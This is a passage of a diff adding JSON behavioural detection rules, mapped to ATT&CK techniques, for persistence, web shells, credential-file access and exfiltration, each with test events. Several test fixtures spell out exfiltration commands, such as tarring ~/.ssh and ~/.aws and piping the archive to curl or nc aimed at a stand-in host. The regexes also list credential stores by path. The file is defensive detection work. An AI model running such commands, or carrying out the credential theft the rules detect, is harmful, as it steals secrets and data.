+    ],
+    "negative": [
+     {
+      "path": "/lib/x86_64-linux-gnu/security/pam_unix2.so",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-ssh-dir-executable-drop",
+   "name": "Script or binary written inside .ssh",
+   "description": "Executable content landing in ~/.ssh outside the usual key files hides payloads where few people look.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564",
+   "technique_name": "Hide Artifacts",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/\\.ssh/[^/]+\\.(sh|py|pl|elf|so|bin|exe|dll|ps1|vbs|bat|js|jar|command)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/dev/.ssh/update.sh",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/home/dev/.ssh/config",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-hidden-executable-in-tmp",
+   "name": "Hidden executable written to temp dir",
+   "description": "A hidden dotfile with executable-style extension in a temp directory is a dropper marker.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.001",
+   "technique_name": "Hidden Files and Directories",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/tmp/|/var/tmp/|/dev/shm/|/private/tmp/|/private/var/tmp/|/run/user/\\d+/|/var/run/shm/)([^/]+/)*\\.[^/]+\\.(sh|py|pl|elf|so|bin|exe|dll|ps1|vbs|bat|js|jar|command)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "dropper"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/tmp/.update.sh",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/tmp/update.sh",
+      "operation": "create"
+     },
+     {
+      "path": "/tmp/.update.sh",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-kernel-module-dropped",
+   "name": "Kernel module written to module directory",
+   "description": "A new .ko under /lib/modules is a rootkit installation marker.",
+   "tactic": "Persistence",
+   "technique": "T1547.006",
+   "technique_name": "Kernel Modules and Extensions",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/(usr/)?lib/modules/[^/]+/.+\\.ko(\\.\\w+)?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "rootkit"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/lib/modules/6.1.0/extra/diamorphine.ko",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/lib/modules/6.1.0/extra/x.ko",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-macos-launchdaemon-created",
+   "name": "LaunchDaemon plist created",
+   "description": "A new plist in /Library/LaunchDaemons gives root-level boot persistence on macOS.",
+   "tactic": "Persistence",
+   "technique": "T1543.004",
+   "technique_name": "Launch Daemon",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/Library/LaunchDaemons/[^/]+\\.plist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/LaunchDaemons/com.apple.updater.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Library/LaunchDaemons/com.apple.updater.plist",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-macos-zsh-startup-write",
+   "name": "macOS shell startup file written",
+   "description": "Writes to zshrc, zprofile or zshenv add execution at every shell start.",
+   "tactic": "Persistence",
+   "technique": "T1546.004",
+   "technique_name": "Unix Shell Configuration Modification",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/Users/[^/]+/(\\.zsh(rc|env|profile)|\\.bash_profile)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/.zshenv",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/.zshenv",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-macos-dylib-in-user-or-tmp",
+   "name": "Dylib written to user Library or temp",
+   "description": "A .dylib created under a user's Library or /tmp supports dylib hijack or injection staging.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.004",
+   "technique_name": "Dylib Hijacking",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/Users/[^/]+/Library/|/private/tmp/|/tmp/|/private/var/tmp/)[^ ]*\\.dylib$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "macos"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/private/tmp/libhook.dylib",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/private/tmp/readme.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-windows-startup-folder-exec",
+   "name": "Executable placed in Startup folder",
+   "description": "Executables or scripts created in the Startup folder run at each logon.",
+   "tactic": "Persistence",
+   "technique": "T1547.001",
+   "technique_name": "Registry Run Keys / Startup Folder",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\start menu\\\\programs\\\\startup\\\\[^\\\\]+\\.(exe|bat|cmd|vbs|js|ps1|lnk|dll|hta)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\u.vbs",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.ini",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-windows-tasks-dir-write",
+   "name": "Scheduled task file written directly",
+   "description": "A file created in the System32 Tasks directory outside schtasks creates hidden scheduled execution.",
+   "tactic": "Persistence",
+   "technique": "T1053.005",
+   "technique_name": "Scheduled Task",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\windows\\\\(system32|syswow64)\\\\tasks\\\\[^\\\\]+$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "persistence"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\Tasks\\Updater",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\System32\\Tasks\\Updater",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-windows-system-dll-created",
+   "name": "DLL created in System32 or SysWOW64",
+   "description": "New DLLs in system directories enable search-order or sideloading persistence.",
+   "tactic": "Persistence",
+   "technique": "T1574.001",
+   "technique_name": "DLL Search Order Hijacking",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\windows\\\\(system32|syswow64)\\\\[^\\\\]+\\.dll$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "dll"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\wlbsctrl.dll",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\System32\\wlbsctrl.dll",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-windows-wbem-mof-dropped",
+   "name": "WMI MOF file dropped",
+   "description": "A .mof in wbem can register WMI event consumers for persistence.",
+   "tactic": "Persistence",
+   "technique": "T1546.003",
+   "technique_name": "WMI Event Subscription",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\wbem\\\\[^\\\\]*\\.mof$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "wmi"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\wbem\\evil.mof",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\System32\\wbem\\evil.mof",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-windows-public-programdata-executable",
+   "name": "Executable content dropped in Public or ProgramData",
+   "description": "Executable content created in C:\\Users\\Public or ProgramData is common malware staging.",
+   "tactic": "Defense Evasion",
+   "technique": "T1036",
+   "technique_name": "Masquerading",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^[a-z]:\\\\(users\\\\public|programdata)\\\\([^\\\\]+\\\\)*[^\\\\]+\\.(exe|dll|ps1|vbs|bat|js|hta|scr)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "staging"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\Public\\run.ps1",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\Public\\notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-web-root-script-created",
+   "name": "Script created in web root",
+   "description": "A server-side script created under a web root is how web shells are planted.",
+   "tactic": "Persistence",
+   "technique": "T1505.003",
+   "technique_name": "Web Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/(var/www|srv/www|usr/share/nginx|inetpub/wwwroot|htdocs|wwwroot)/([^/\\\\]+/)*[^/\\\\]+\\.(php\\d?|phtml|jsp|jspx|asp|aspx|cgi|pl)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "webshell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/var/www/html/uploads/x.php",
+      "operation": "create"
+     },
+     {
+      "path": "C:/inetpub/wwwroot/a.aspx",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/var/www/html/index.html",
+      "operation": "create"
+     },
+     {
+      "path": "/var/www/html/x.php",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-upload-dir-server-script",
+   "name": "Server script appears in upload or media directory",
+   "description": "An executable server script inside an uploads, images or cache directory is an upload-bypass web shell.",
+   "tactic": "Persistence",
+   "technique": "T1505.003",
+   "technique_name": "Web Shell",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/(uploads?|images|media|files|cache|tmp)/([^/]+/)*[^/]*\\.(php\\d?|phtml|jsp|aspx?)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "webshell"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/var/www/wp-content/uploads/2024/a.php",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/var/www/wp-content/uploads/2024/a.jpg",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-ssh-key-material-in-tmp",
+   "name": "SSH key material staged in temp",
+   "description": "authorized_keys or private key files in temp dirs show key staging before install or theft.",
+   "tactic": "Persistence",
+   "technique": "T1098.004",
+   "technique_name": "SSH Authorized Keys",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/tmp/|/var/tmp/|/dev/shm/|/private/tmp/|/private/var/tmp/|/run/user/\\d+/|/var/run/shm/)([^/]+/)*(authorized_keys\\d?|id_(rsa|ed25519|ecdsa)|[^/]*\\.pem)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create",
+       "modify"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "ssh"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/tmp/authorized_keys",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/tmp/readme",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-shadow-hash-read",
+   "name": "Shadow or password hash file opened",
+   "description": "Read access to /etc/shadow or gshadow is the precursor of offline cracking and rarely appears outside auth daemons.",
+   "tactic": "Credential Access",
+   "technique": "T1003.008",
+   "technique_name": "/etc/passwd and /etc/shadow",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^/etc/(shadow|gshadow|master\\.passwd)-?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "read",
+       "open",
+       "access",
+       "copy"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/shadow",
+      "operation": "read"
+     },
+     {
+      "path": "/etc/shadow",
+      "operation": "open"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/shadow",
+      "operation": "modify"
+     },
+     {
+      "path": "/etc/passwd",
+      "operation": "read"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-browser-credential-db-read",
+   "name": "Browser credential database read",
+   "description": "Reads of Login Data, logins.json or cookie databases show browser secret harvesting.",
+   "tactic": "Credential Access",
+   "technique": "T1555.003",
+   "technique_name": "Credentials from Web Browsers",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "(/Google/Chrome/[^/]+/(Login Data|Cookies|Web Data)|/Firefox/Profiles/[^/]+/(logins\\.json|key[34]\\.db|cookies\\.sqlite)|/Microsoft/Edge/[^/]+/(Login Data|Cookies)|/BraveSoftware/[^/]+/[^/]+/Login Data)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "read",
+       "open",
+       "access",
+       "copy"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Library/Application Support/Google/Chrome/Default/Login Data",
+      "operation": "read"
+     },
+     {
+      "path": "C:/Users/ann/AppData/Roaming/Mozilla/Firefox/Profiles/a.default/logins.json",
+      "operation": "open"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Library/Application Support/Google/Chrome/Default/Login Data",
+      "operation": "delete"
+     },
+     {
+      "path": "/Users/ann/Library/Application Support/Google/Chrome/Default/Bookmarks",
+      "operation": "read"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-ssh-private-key-read",
+   "name": "SSH private key opened",
+   "description": "Opening id_rsa or id_ed25519 private keys indicates theft for lateral movement; legitimate use is by ssh itself.",
+   "tactic": "Credential Access",
+   "technique": "T1552.004",
+   "technique_name": "Private Keys",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/\\.ssh/(id_rsa|id_dsa|id_ecdsa|id_ed25519)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "read",
+       "open",
+       "access",
+       "copy"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/dev/.ssh/id_rsa",
+      "operation": "read"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/home/dev/.ssh/id_rsa.pub",
+      "operation": "read"
+     },
+     {
+      "path": "/home/dev/.ssh/id_rsa",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-cloud-credentials-read",
+   "name": "Cloud credential file opened",
+   "description": "Reads of aws credentials, gcloud, azure or kube config reveal cloud key harvesting.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Credentials In Files",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/(\\.aws/credentials|\\.config/gcloud/(credentials\\.db|application_default_credentials\\.json|access_tokens\\.db)|\\.azure/(accessTokens|msal_token_cache)\\.json|\\.kube/config|\\.docker/config\\.json)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "read",
+       "open",
+       "access",
+       "copy"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "cloud",
+    "credentials",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/dev/.aws/credentials",
+      "operation": "read"
+     },
+     {
+      "path": "/home/dev/.kube/config",
+      "operation": "open"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/home/dev/.aws/config",
+      "operation": "read"
+     },
+     {
+      "path": "/home/dev/.aws/credentials",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-macos-keychain-db-opened",
+   "name": "Keychain database accessed as a file",
+   "description": "Direct opens of login.keychain-db or the system keychain bypass the security tool and indicate theft.",
+   "tactic": "Credential Access",
+   "technique": "T1555.001",
+   "technique_name": "Keychain",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/Keychains/(login\\.keychain(-db)?|System\\.keychain|[A-F0-9-]+/keychain-2\\.db)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "read",
+       "open",
+       "copy",
+       "access"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Library/Keychains/login.keychain-db",
+      "operation": "copy"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Library/Keychains/login.keychain-db",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-windows-sam-ntds-copy",
+   "name": "SAM, SYSTEM or NTDS hive accessed",
+   "description": "Opening or copying the SAM or SYSTEM hives or ntds.dit enables offline credential extraction.",
+   "tactic": "Credential Access",
+   "technique": "T1003.002",
+   "technique_name": "Security Account Manager",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "(\\\\windows\\\\system32\\\\config\\\\(sam|system|security)|\\\\ntds\\\\ntds\\.dit|\\\\windows\\\\repair\\\\sam)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "read",
+       "open",
+       "copy",
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\config\\SAM",
+      "operation": "copy"
+     },
+     {
+      "path": "C:\\Windows\\NTDS\\ntds.dit",
+      "operation": "copy"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\System32\\config\\SAM",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-lsass-dump-created",
+   "name": "LSASS or process memory dump created",
+   "description": "A dmp file named lsass, or a dmp in a temp dir, is a credential dump artefact.",
+   "tactic": "Credential Access",
+   "technique": "T1003.001",
+   "technique_name": "LSASS Memory",
+   "severity": "critical",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "(lsass[^\\\\]*\\.(dmp|dump)|\\\\temp\\\\[^\\\\]*\\.dmp)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Local\\Temp\\lsass.dmp",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Users\\ann\\AppData\\Local\\Temp\\lsass.dmp",
+      "operation": "delete"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-secret-dotfile-read",
+   "name": "Shell history or secret dotfile opened",
+   "description": "Reads of netrc, pgpass, git-credentials, npmrc or pypirc harvest stored secrets.",
+   "tactic": "Credential Access",
+   "technique": "T1552.001",
+   "technique_name": "Credentials In Files",
+   "severity": "low",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "/\\.(netrc|pgpass|git-credentials|npmrc|pypirc)$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "read",
+       "copy"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "credentials",
+    "noisy"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/home/dev/.git-credentials",
+      "operation": "read"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/home/dev/.git-credentials",
+      "operation": "modify"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-file-credential-copy-to-tmp",
+   "name": "Credential file copied to temp",
+   "description": "Credential stores copied into a temp dir (shadow, passwd, keys, ntds) are staged for exfiltration.",
+   "tactic": "Collection",
+   "technique": "T1005",
+   "technique_name": "Data from Local System",
+   "severity": "high",
+   "os": "any",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "^(/tmp/|/var/tmp/|/dev/shm/|/private/tmp/|/private/var/tmp/|/run/user/\\d+/|/var/run/shm/)([^/]+/)*(shadow|passwd|ntds\\.dit|SAM|id_rsa|login\\.keychain-db|Login Data)(\\.(bak|copy|old|txt|tgz|gz|zip))?$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "staging"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "path": "/tmp/shadow.bak",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/tmp/passwd-notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-archive-sensitive-dir-then-upload",
+   "name": "Archive of sensitive directory with upload in same line",
+   "description": "tar or zip of .ssh, .aws, /etc or keychains with curl, nc or scp in the same command is credential exfiltration.",
+   "tactic": "Exfiltration",
+   "technique": "T1560.001",
+   "technique_name": "Archive via Utility",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(tar|zip|7z|7za)\\b.*(\\.ssh|\\.aws|\\.gnupg|\\.kube|/etc/(shadow|passwd)|Keychains|\\.config/gcloud).*(\\||&&|;).*(curl|wget|nc |ncat|scp|sftp|ftp)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tar czf - ~/.ssh ~/.aws | curl -T - http://203.0.113.9/up"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c zip -r k.zip ~/Library/Keychains && curl -F f=@k.zip http://h/u"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tar czf backup.tgz ~/.ssh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-archive-pipe-to-network",
+   "name": "tar piped directly into a network client",
+   "description": "tar to stdout piped into nc, curl -T or openssl streams a directory off the box without a local file.",
+   "tactic": "Exfiltration",
+   "technique": "T1048",
+   "technique_name": "Exfiltration Over Alternative Protocol",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "tar\\s+\\S*c\\S*\\s+.*\\|\\s*(nc|ncat|netcat|curl\\s+.*-(T|d|-data-binary)|openssl\\s+s_client)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tar czf - /var/www | nc 203.0.113.9 9999"
+     },
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tar cf - /home | curl -T - http://h/up"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/sh",
+      "command": "sh -c tar cf - src | gzip > src.tgz"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-archive-password-protected-user-docs",
+   "name": "Password-protected archive of user documents",
+   "description": "zip -P or 7z -p over Documents or Desktop shows staged, encrypted exfil packaging.",
+   "tactic": "Collection",
+   "technique": "T1560.001",
+   "technique_name": "Archive via Utility",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(zip\\s+.*-(P|e)\\s+\\S+|7za?\\s+a\\s+.*-p\\S+|rar\\s+a\\s+.*-hp\\S*).*(documents|desktop|downloads|/home/|/users/)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r -P s3cret out.zip /Users/ann/Documents"
+     },
+     {
+      "executable": "/usr/bin/7z",
+      "command": "7z a -pSecret out.7z C:\\Users\\ann\\Documents"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/zip",
+      "command": "zip -r out.zip /Users/ann/Documents"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ioa-windows-archive-then-upload",
+   "name": "Archive then upload in one Windows command line",
+   "description": "Compress-Archive, 7z or rar followed by curl, Invoke-WebRequest or ftp in one line stages and sends data.",
+   "tactic": "Exfiltration",
+   "technique": "T1560",
+   "technique_name": "Archive Collected Data",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(compress-archive|7z\\s+a|rar\\s+a|makecab).*(;|&&|\\|).*(curl|invoke-webrequest|iwr|invoke-restmethod|ftp|bitsadmin|webclient)"
+   },
+   "tags": [
+    "behavioural",
+    "ioa",
+    "exfil"
+   ],
+   "batch": "b-behavioural",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
+      "command": "cmd /c 7z a d.7z C:\\data && curl -T d.7z http://h/u"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\cmd.exe",
